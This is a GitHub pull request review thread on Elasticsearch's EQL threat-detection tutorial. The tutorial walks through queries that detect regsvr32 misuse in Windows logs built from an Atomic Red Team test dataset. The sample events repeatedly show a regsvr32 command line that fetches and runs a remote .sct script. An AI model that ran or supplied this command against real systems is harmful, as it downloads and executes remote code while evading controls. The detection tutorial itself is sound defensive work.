\"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\n+            \"ppid\": 2652\n+          },\n+          \"logon_id\": 217055,\n+          \"@timestamp\": 131883573237130000,\n+          \"event\": {\n+            \"category\": \"process\",\n+            \"type\": \"creation\"\n+          },\n+          \"user\": {\n+            \"full_name\": \"bob\",\n+            \"domain\": \"ART-DESKTOP\",\n+            \"id\": \"ART-DESKTOP\\\\bob\"\n+          }\n+        }\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 21/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"gl5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-check-for-malicious-script-loads]]\n+=== Check for malicious script loads\n+\n+You now know that `regsvr32.exe` was used to register\n+a potentially malicious script as `scrob.dll`. Next, find any processes that\n+later load the `scrob.dll` file.\n+\n+Modify the previous EQL query as follows:\n+\n+* Change the `any` keyword to `file`. This means the query only matches\n+events with an `event.category` of `file`.\n+* Add the `file.name == \"scrobj.dll` condition to check for loads of\n+the `scrobj.dll` file.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    file where process.name == \"regsvr32.exe\" and file.name == \"scrobj.dll\"\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches an event, confirming that `scrobj.dll` was later loaded by\n+`regsvr32.exe`.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 5,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"my-index-000001\",\n+        \"_id\": \"ol5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n+          },\n+          \"file\": {\n+            \"path\": \"C:\\\\Windows\\\\System32\\\\scrobj.dll\",\n+            \"name\": \"scrobj.dll\"\n+          },\n+          \"@timestamp\": 131883573237450016,\n+          \"event\": {\n+            \"category\": \"file\"\n+          }\n+        }\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 5/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"ol5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-detemine-likelihood-of-sucess]]\n+=== Determine likelihood of success\n+\n+In many cases, malicious scripts are used to download other remote files. If\n+this occurred, the attack progressed and might have succeeded.\n+\n+Use an <<eql-sequences,EQL sequence query>> to check for the following series of", "state": "SUBMITTED", "replyTo": null, "originalCommit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "originalPosition": 271}]}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3NTc0MDY2", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467574066", "createdAt": "2020-08-14T13:28:46Z", "commit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "state": "COMMENTED", "comments": {"totalCount": 1, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoyODo0N1rOHA0knQ==", "endCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoyODo0N1rOHA0knQ==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYyMzM4OQ==", "bodyText": "Change to however you want to communicate this\n\n  \n    \n      \n        Suggested change\n        \n          \n    \n\n        \n      \n    \n    \n      \n          \n            \n            . A `regsvr32.exe` process, which could have been used to register malicious\n          \n          \n            \n            scripts as `scrobj.dll`\n          \n          \n            \n            . A load of the `scrobj.dll` file\n          \n          \n            \n            . Any network event, which could indicate the download of a remote file\n          \n          \n            \n            . A `regsvr32.exe` process, which could have been used to register malicious\n          \n          \n            \n            scripts as `scrobj.dll`\n          \n          \n            \n            . A load of the `scrobj.dll` file by that same process\n          \n          \n            \n            . Any network event by that same process, which could indicate the download of a remote file", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470623389", "createdAt": "2020-08-14T13:28:47Z", "author": {"login": "rw-access"}, "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.\n+This limits matching results to events that contain a `process.command_line`\n+value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\" and process.command_line > 0\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches one event. Based on the event's `process.command_line` value,\n+`regsvr32.exe` was used to register a script as `scrobj.dll`. This fits known\n+regsvr32 misuse behavior.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 21,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"my-index-000001\",\n+        \"_id\": \"gl5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"parent\": {\n+              \"name\": \"cmd.exe\",\n+              \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010AA385401}\",\n+              \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n+            },\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"command_line\": \"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\n+            \"ppid\": 2652\n+          },\n+          \"logon_id\": 217055,\n+          \"@timestamp\": 131883573237130000,\n+          \"event\": {\n+            \"category\": \"process\",\n+            \"type\": \"creation\"\n+          },\n+          \"user\": {\n+            \"full_name\": \"bob\",\n+            \"domain\": \"ART-DESKTOP\",\n+            \"id\": \"ART-DESKTOP\\\\bob\"\n+          }\n+        }\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 21/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"gl5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-check-for-malicious-script-loads]]\n+=== Check for malicious script loads\n+\n+You now know that `regsvr32.exe` was used to register\n+a potentially malicious script as `scrob.dll`. Next, find any processes that\n+later load the `scrob.dll` file.\n+\n+Modify the previous EQL query as follows:\n+\n+* Change the `any` keyword to `file`. This means the query only matches\n+events with an `event.category` of `file`.\n+* Add the `file.name == \"scrobj.dll` condition to check for loads of\n+the `scrobj.dll` file.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    file where process.name == \"regsvr32.exe\" and file.name == \"scrobj.dll\"\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches an event, confirming that `scrobj.dll` was later loaded by\n+`regsvr32.exe`.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 5,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"my-index-000001\",\n+        \"_id\": \"ol5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n+          },\n+          \"file\": {\n+            \"path\": \"C:\\\\Windows\\\\System32\\\\scrobj.dll\",\n+            \"name\": \"scrobj.dll\"\n+          },\n+          \"@timestamp\": 131883573237450016,\n+          \"event\": {\n+            \"category\": \"file\"\n+          }\n+        }\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 5/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"ol5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-detemine-likelihood-of-sucess]]\n+=== Determine likelihood of success\n+\n+In many cases, malicious scripts are used to download other remote files. If\n+this occurred, the attack progressed and might have succeeded.\n+\n+Use an <<eql-sequences,EQL sequence query>> to check for the following series of\n+events, in order:\n+\n+. A `regsvr32.exe` process, which could have been used to register malicious\n+scripts as `scrobj.dll`\n+. A load of the `scrobj.dll` file\n+. Any network event, which could indicate the download of a remote file", "state": "SUBMITTED", "replyTo": null, "originalCommit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "originalPosition": 277}]}}, {"__typename": "PullRequestCommit", "commit": {"oid": "6311651939e3f23db2b0cba7b998ef5fbed6ee66", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/6311651939e3f23db2b0cba7b998ef5fbed6ee66", "committedDate": "2020-08-14T14:58:57Z", "message": "Address feedback"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "7a309b2ec44500d1b220696cdf96628c2cbad323", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/7a309b2ec44500d1b220696cdf96628c2cbad323", "committedDate": "2020-08-14T15:01:41Z", "message": "typos"}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3NjQ5MDIx", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467649021", "createdAt": "2020-08-14T15:02:12Z", "commit": {"oid": "7a309b2ec44500d1b220696cdf96628c2cbad323"}, "state": "COMMENTED", "comments": {"totalCount": 1, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxNTowMjoxMlrOHA4B5w==", "endCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxNTowMjoxMlrOHA4B5w==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDY4MDAzOQ==", "bodyText": "probably safe to remove", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470680039", "createdAt": "2020-08-14T15:02:12Z", "author": {"login": "rw-access"}, "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,434 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1218/010/[`regsvr32` misuse] in Windows event\n+logs. `regsvr32` misuse is a known adversary technique documented in the\n+https://attack.mitre.org[MITRE ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for `regsvr32` misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to use some fields from the {ecs-ref}[Elastic Common\n+Schema (ECS)], including the `@timestamp` and `event.category` fields. The\n+dataset includes events that imitate behaviors related to `regsvr32` misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by looking at any events\n+associated with a `regsvr32.exe` process.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events   <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"                <2>\n+  \"\"\",\n+  \"size\": 200                                               <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 200 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Based on your previous query, you know `regsvr32` processes were associated with\n+143 events. But how was first `regsvr32.exe` called? And who called it?\n+\n+`regsvr32` is a command-line utility so narrowing your results to processes where\n+the command line was used may help.\n+\n+First, in the previous EQL query, change the `any` keyword to `process`. This\n+means the query will only match processes, which have an `event.category` of\n+`process`.\n+\n+Next, append `and process.command_line != null` to the query. Now the query will\n+only match processes with a command line value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    process where process.name == \"regsvr32.exe\" and process.command_line != null\n+  \"\"\",\n+  \"size\": 150", "state": "SUBMITTED", "replyTo": null, "originalCommit": {"oid": "7a309b2ec44500d1b220696cdf96628c2cbad323"}, "originalPosition": 138}]}}, {"__typename": "PullRequestCommit", "commit": {"oid": "dce4db4c6185f0dc97c979c35d3e9be2c7bc847a", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/dce4db4c6185f0dc97c979c35d3e9be2c7bc847a", "committedDate": "2020-08-14T15:02:37Z", "message": "clarify"}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3NjUwMDg2", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467650086", "createdAt": "2020-08-14T15:03:30Z", "commit": {"oid": "7a309b2ec44500d1b220696cdf96628c2cbad323"}, "state": "COMMENTED", "comments": {"totalCount": 1, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxNTowMzozMFrOHA4FCA==", "endCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxNTowMzozMFrOHA4FCA==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDY4MDg0MA==", "bodyText": "I believe this is more technically correct\n\n  \n    \n      \n        Suggested change\n        \n          \n    \n\n        \n      \n    \n    \n      \n          \n            \n            `process.command_line` value, `regsvr32.exe` was used to register a script as\n          \n          \n            \n            `scrobj.dll`. This fits the behavior of a\n          \n          \n            \n            `process.command_line` value, `regsvr32.exe` used `scrobj.dll` to register a script.\n          \n          \n            \n            This fits the behavior of a", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470680840", "createdAt": "2020-08-14T15:03:30Z", "author": {"login": "rw-access"}, "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,434 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1218/010/[`regsvr32` misuse] in Windows event\n+logs. `regsvr32` misuse is a known adversary technique documented in the\n+https://attack.mitre.org[MITRE ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for `regsvr32` misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to use some fields from the {ecs-ref}[Elastic Common\n+Schema (ECS)], including the `@timestamp` and `event.category` fields. The\n+dataset includes events that imitate behaviors related to `regsvr32` misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by looking at any events\n+associated with a `regsvr32.exe` process.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events   <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"                <2>\n+  \"\"\",\n+  \"size\": 200                                               <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 200 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Based on your previous query, you know `regsvr32` processes were associated with\n+143 events. But how was first `regsvr32.exe` called? And who called it?\n+\n+`regsvr32` is a command-line utility so narrowing your results to processes where\n+the command line was used may help.\n+\n+First, in the previous EQL query, change the `any` keyword to `process`. This\n+means the query will only match processes, which have an `event.category` of\n+`process`.\n+\n+Next, append `and process.command_line != null` to the query. Now the query will\n+only match processes with a command line value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    process where process.name == \"regsvr32.exe\" and process.command_line != null\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches one process. The event has an `event.type` of `creation`,\n+indicating the start of a `regsvr32.exe` process. Based on the\n+`process.command_line` value, `regsvr32.exe` was used to register a script as\n+`scrobj.dll`. This fits the behavior of a", "state": "SUBMITTED", "replyTo": null, "originalCommit": {"oid": "7a309b2ec44500d1b220696cdf96628c2cbad323"}, "originalPosition": 146}]}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3NjUxMTA4", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467651108", "createdAt": "2020-08-14T15:04:49Z", "commit": {"oid": "7a309b2ec44500d1b220696cdf96628c2cbad323"}, "state": "COMMENTED", "comments": {"totalCount": 1, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxNTowNDo0OVrOHA4ICQ==", "endCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxNTowNDo0OVrOHA4ICQ==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDY4MTYwOQ==", "bodyText": "Suggested change\n        \n          \n    \n\n        \n      \n    \n    \n      \n          \n            \n            You now know that a `regsvr32.exe` process was used to register a potentially\n          \n          \n            \n            malicious script as `scrob.dll`. Next, see if `regsvr32.exe` later loads the\n          \n          \n            \n            You now know that a `regsvr32.exe` process was used to execute a potentially\n          \n          \n            \n            malicious script `RegSvr32.sct`. Next, see if `regsvr32.exe` later loads the", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470681609", "createdAt": "2020-08-14T15:04:49Z", "author": {"login": "rw-access"}, "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,434 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1218/010/[`regsvr32` misuse] in Windows event\n+logs. `regsvr32` misuse is a known adversary technique documented in the\n+https://attack.mitre.org[MITRE ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for `regsvr32` misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to use some fields from the {ecs-ref}[Elastic Common\n+Schema (ECS)], including the `@timestamp` and `event.category` fields. The\n+dataset includes events that imitate behaviors related to `regsvr32` misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by looking at any events\n+associated with a `regsvr32.exe` process.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of 